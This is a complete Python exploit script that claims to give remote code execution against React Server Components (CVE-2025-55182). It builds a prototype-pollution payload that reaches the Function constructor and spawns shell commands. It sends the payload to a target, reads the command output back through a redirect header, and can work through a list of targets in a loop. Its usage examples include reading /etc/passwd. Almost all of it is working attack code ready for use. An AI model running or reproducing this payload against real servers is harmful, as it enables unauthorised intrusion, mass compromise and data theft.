#!/usr/bin/env python3
"""
CVE-2025-55182 RCE Exploit
Remote Code Execution exploit for React Server Components (CVE-2025-55182)

Vulnerability Mechanism:

The exploit leverages prototype pollution in React Flight Protocol deserialization.
It pollutes Object.prototype.then via "$1:__proto__:then" and gains Function constructor
access through _formData.get set to "$1:constructor:constructor", then injects malicious
code via _prefix that gets executed by Function().

Usage:
    python3 CVE-2025-55182.py http://target.com:3000 -c "id"
    python3 CVE-2025-55182.py https://target.com -c "whoami" --no-check-ssl
    python3 CVE-2025-55182.py 192.168.1.100:3000 -c "uname -a"
    python3 CVE-2025-55182.py -f targets.txt -c "id"
    
Command output is retrieved via NEXT_REDIRECT header (X-Action-Redirect).
"""

import requests
import sys
import argparse
import urllib3
import json
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def build_payload(command):
    """
    Build RCE payload based on working exploit from Spritualkb
    Uses spawnSync and NEXT_REDIRECT error to get command output
    
    Args:
        command: Command to execute
    """
    # Escape single quotes in command for JavaScript string
    escaped_cmd = command.replace("'", "'\"'\"'")
    
    # Build the prefix payload that executes the command
    # Use spawnSync with shell option for better stability
    # Throw NEXT_REDIRECT error with command output in digest
    prefix_payload = (
        f"var r=process.mainModule.require('child_process').spawnSync('sh',['-c','{escaped_cmd}'],{{encoding:'utf8',timeout:5000}});"
        f"var res=r.stdout||r.stderr||'';"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:`NEXT_REDIRECT;push;/login?a=${{res.trim()}};307;`}});"
    )
    
    # Malicious fake chunk structure - different from original PoC
    part0 = (
        '{"then":"$1:__proto__:then",'
        '"status":"resolved_model",'
        '"reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}",'
        '"_response":{'
        '"_prefix":"' + prefix_payload + '",'
        '"_chunks":"$Q2",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '}}'
    )
    
    payload = {
        '0': part0,
        '1': '"$@0"',
        '2': '[]'
    }
    
    return payload

def normalize_url(url):
    """Normalize URL - add http:// if missing, handle IP:PORT format"""
    url = url.strip()
    
    # If no scheme, add http://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    return url

def read_urls_from_file(filename):
    """Read URLs from a file, one per line"""
    urls = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):  # Skip empty lines and comments
                    urls.append(line)
        return urls
    except FileNotFoundError:
        print(f"[!] File not found: {filename}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading file {filename}: {e}")
        sys.exit(1)

def exploit(target_url, command, verify_ssl=True, action_id=None, verbose=False):
    """
    Exploit CVE-2025-55182 to execute arbitrary command
    
    Args:
        target_url: Target URL (e.g., http://target.com:3000)
        command: Command to execute
        verify_ssl: Whether to verify SSL certificates
        action_id: Optional Next-Action header value
    """
    target_url = normalize_url(target_url)
    
    # Default action ID from original PoC
    if action_id is None:
        action_id = '409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0'
    
    headers = {
        'Next-Action': action_id,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15'
    }
    
    payload = build_payload(command)
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {command}")
    if not verify_ssl:
        print("[*] SSL certificate verification disabled")
    print(f"[*] Building payload...")
    
    try:
        # Send POST request with multipart/form-data
        files = {}
        for key, value in payload.items():
            files[key] = (None, value)
        
        print(f"[*] Sending exploit payload...")
        # Use shorter timeout - RCE execution may cause server to hang
        response = requests.post(
            target_url,
            files=files,
            headers=headers,
            verify=verify_ssl,
            timeout=5,  # Short timeout - if code executes, server may hang
            allow_redirects=False
        )
        
        if verbose:
            print(f"[*] Status Code: {response.status_code}")
            print(f"[*] Response Headers: {dict(response.headers)}")
        
        # Check response for command output
        if 'X-Action-Redirect' in response.headers or 'x-action-redirect' in response.headers:
            redirect = response.headers.get('X-Action-Redirect') or response.headers.get('x-action-redirect', '')
            if 'login?a=' in redirect:
                # Extract command output from redirect
                output = redirect.split('login?a=')[1].split(';')[0]
                print(f"\n{'='*60}")
                print(f"[+] Command executed successfully!")
                print(f"{'='*60}")
                print(f"[+] Command Output:")
                print(f"{'-'*60}")
                print(output)
                print(f"{'-'*60}")
                return response, output
        
        # Check for error-based indicators
        if response.status_code == 500:
            print("[!] Server returned 500 error")
            if 'text/x-component' in response.headers.get('Content-Type', ''):
                print("[+] Content-Type indicates React Flight Protocol response")
            if 'digest' in response.text:
                print("[+] Response contains React error digest (exploitation attempted)")
        
        # Try to extract output from response body
        response_text = response.text
        if 'login?a=' in response_text:
            # Extract from response body
            output = response_text.split('login?a=')[1].split(';')[0]
            print(f"\n{'='*60}")
            print(f"[+] Command output found in response body!")
            print(f"{'='*60}")
            print(f"[+] Command Output:")
            print(f"{'-'*60}")
            print(output)
            print(f"{'-'*60}")
            return response, output
        
        if response_text and verbose:
            print(f"\n[*] Response ({len(response_text)} bytes):")
            print(response_text[:500])
            if len(response_text) > 500:
                print("... (truncated)")
        
        return response, None
        
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        print("[+] This may indicate successful code execution!")
        print("[+] Check target server logs for command output")
        print("[+] If using callback URL, check your callback server for output")
        return None, "timeout"
    except requests.exceptions.SSLError as e:
        print(f"[!] SSL Error: {e}")
        print("[!] Try using --no-check-ssl flag")
        return None, f"ssl_error: {e}"
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None, f"request_error: {e}"
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return None, f"unexpected_error: {e}"

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 RCE Exploit - React Server Components Remote Code Execution',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s http://target.com:3000 -c "id"
  %(prog)s https://target.com -c "whoami" --no-check-ssl
  %(prog)s 192.168.1.100:3000 -c "uname -a"
  %(prog)s -f targets.txt -c "id"
  %(prog)s http://localhost:3000 -c "cat /etc/passwd"
        """
    )
    
    # Create mutually exclusive group for target and file
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('target', nargs='?', help='Target URL or IP:PORT (e.g., http://target.com:3000 or 192.168.1.100:3000)')
    target_group.add_argument('-f', '--file', help='File containing list of target URLs (one per line)')
    
    parser.add_argument('-c', '--command', required=True, help='Command to execute on target')
    parser.add_argument('--no-check-ssl', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--action-id', help='Custom Next-Action header value (default: from original PoC)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-55182 RCE Exploit")
    print("React Server Components Remote Code Execution")
    print("=" * 60)
    print()
    
    verify_ssl = not args.no_check_ssl
    
    # Handle single target
    if args.target:
        # Call the exploit function
        result, output = exploit(
            target_url=args.target,
            command=args.command,
            verify_ssl=verify_ssl,
            action_id=args.action_id,
            verbose=args.verbose
        )
        
        if result is None and output == "timeout":
            print("\n[!] Exploitation may have succeeded but response was not received")
            print("[!] Check target server logs for command execution")
            sys.exit(0)
        elif result is None:
            print("\n[!] Exploitation failed")
            sys.exit(1)
        
        print(f"\n{'='*60}")
        print("[*] Exploitation attempt completed")
        print(f"{'='*60}")
    
    # Handle multiple targets from file
    elif args.file:
        urls = read_urls_from_file(args.file)
        print(f"[*] Loaded {len(urls)} targets from {args.file}")
        print(f"[*] Command: {args.command}")
        print()
        
        successful_exploits = []
        
        for i, url in enumerate(urls, 1):
            print(f"\n{'='*60}")
            print(f"[{i}/{len(urls)}] Testing: {url}")
            print(f"{'='*60}")
            
            # Call the exploit function
            result, output = exploit(
                target_url=url,
                command=args.command,
                verify_ssl=verify_ssl,
                action_id=args.action_id,
                verbose=args.verbose
            )
            
            # Store successful exploits (where we got actual output)
            if output and output not in ["timeout", None] and not any(err in output for err in ["error", "ssl_error", "request_error"]):
                successful_exploits.append({
                    'url': url,
                    'output': output
                })
        
        # Print summary of successful exploits
        print("\n" + "=" * 70)
        print("SUCCESSFUL EXPLOITS SUMMARY")
        print("=" * 70)
        
        if successful_exploits:
            for exploit_item in successful_exploits:
                print(f"\nURL: {exploit_item['url']}")
                print(f"Output: {exploit_item['output']}")
                print("-" * 70)
            
            print(f"\n[+] Total successful exploits: {len(successful_exploits)}/{len(urls)}")
        else:
            print("\n[-] No successful exploits found")
        
        print("=" * 70)
        
        # Exit with appropriate code
        if successful_exploits:
            sys.exit(0)
        else:
            sys.exit(1)

if __name__ == '__main__':
    main()
